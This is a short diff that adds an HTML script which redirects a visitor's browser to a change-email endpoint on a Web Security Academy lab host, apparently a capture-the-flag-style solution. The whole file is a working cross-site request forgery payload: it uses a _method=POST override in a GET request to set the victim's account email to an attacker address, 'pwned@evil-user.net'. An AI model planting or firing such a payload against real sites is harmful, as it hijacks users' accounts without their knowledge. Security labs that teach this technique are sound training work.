@@ -1,0 +1,3 @@
+<script>
+  document.location = "https://<LAB-ID>.web-security-academy.net/my-account/change-email?email=pwned%40evil-user.net&_method=POST"
+</script>
